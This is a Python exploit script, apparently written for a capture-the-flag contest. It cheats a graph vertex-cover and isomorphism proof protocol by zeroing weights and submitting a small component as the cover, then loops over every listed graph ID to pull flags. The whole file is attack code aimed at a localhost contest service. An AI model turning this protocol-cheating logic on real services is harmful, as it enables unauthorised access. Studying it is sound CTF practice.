import json
import uuid
import asyncio

from api import Api
import random


def dfs(v, us, adj_list):
    if v in us:
        return set()
    us.add(v)
    cur = set([v])
    for u in adj_list[v]:
        cur.update(dfs(u, us, adj_list))
    return cur


def find_small_vc(n, edges):
    adj_list = [[] for _ in range(n)]
    for e in edges:
        v, u = e['v'], e['u']
        adj_list[v].append(u)
        adj_list[u].append(v)
    us = set()
    for i in range(n):
        if i not in us:
            cur = dfs(i, us, adj_list)
            if len(cur) < 11:
                return cur


def create_graph_and_vc(id, response, rid, cheat_with_weights):
    d = dict()
    d['reqId'] = rid
    d['graph'] = response['graph']
    d['graphId'] = id
    d['graph']['id'] = id
    if cheat_with_weights:
        d['graph']['weight'] = [0 for _ in range(d['graph']['n'])]
        d['vc'] = list(range(d['graph']['n']))
    else:
        d['vc'] = find_small_vc(d['graph']['n'], d['graph']['edges'])
    return d


async def steal_flag(id, host):
    rid = str(uuid.uuid4())

    d = dict()
    d['type'] = 'GET_GRAPH'
    d['graphId'] = id
    d['reqId'] = rid

    _json = json.dumps(d)

    async with Api(host) as api:
        try:
            downloaded_json = (await api.send_and_get(_json))
        except Exception as e:
            pass

    req = create_graph_and_vc(id, downloaded_json, rid, False)

    for _ in range(30):
        iso_req, perm = create_iso(req, req['reqId'])
        async with Api(host) as api:
            try:
                downloaded_json = (await api.send_and_get(json.dumps(iso_req)))
            except Exception as e:
                pass

        type = downloaded_json['type']

        if type == 'REQ_VC':
            vc_req = create_vc(req['vc'], perm, req['reqId'])
            data = json.dumps(vc_req)
        else:
            perm_req = create_perm(perm, req['reqId'])
            data = json.dumps(perm_req)

        assert(perm[list(req['vc'])[0]] == 0)

        async with Api(host) as api:
            try:
                downloaded_json = (await api.send_and_get(data))
            except Exception as e:
                pass

        if downloaded_json['type'] == 'OK':
            return downloaded_json['flag']


async def steal_flags(host):
    d = dict()
    d['type'] = 'LIST'

    _json = json.dumps(d)

    async with Api(host) as api:
        try:
            downloaded_json = (await api.send_and_get(_json))
        except Exception as e:
            pass

    ids = downloaded_json['ids']

    flags = []
    c = []
    for id in ids:
        c.append(steal_flag(id, host))
    for _c in c:
        flags.append(await _c)
    return flags


def modify_graph(graph, vc):
    n = graph['n']
    perm = list(range(n))

    random.shuffle(perm)

    v = list(vc)[0]
    if perm[v] != 0:
        u = 0
        while perm[u] != 0:
            u += 1
        perm[v], perm[u] = perm[u], perm[v]

    g = dict()
    g['n'] = n
    g['weight'] = [0 for _ in range(n)]
    for i in range(n):
        g['weight'][perm[i]] = graph['weight'][i]
    g['limit'] = graph['limit']
    g['edges'] = []
    for e in graph['edges']:
        v = e['v']
        u = e['u']
        g['edges'].append({"v": perm[v], "u": perm[u]})
    return g, perm


def create_iso(req, reqId):
    d = dict()
    d['reqId'] = reqId
    d['type'] = 'SEND_ISO'
    d['graphId'] = req['graphId']
    d['graph'], perm = modify_graph(req['graph'], req['vc'])
    return d, perm


def modify_vc(vc, perm):
    return [perm[v] for v in vc]


def create_vc(vc, perm, reqId):
    d = dict()
    d['reqId'] = reqId
    d['type'] = 'SEND_VC'
    d['vc'] = modify_vc(vc, perm)
    return d


def create_perm(perm, reqId):
    d = dict()
    d['reqId'] = reqId
    d['type'] = 'SEND_PERM'
    d['perm'] = perm
    return d


if __name__ == "__main__":
    print(asyncio.run(steal_flags("localhost")))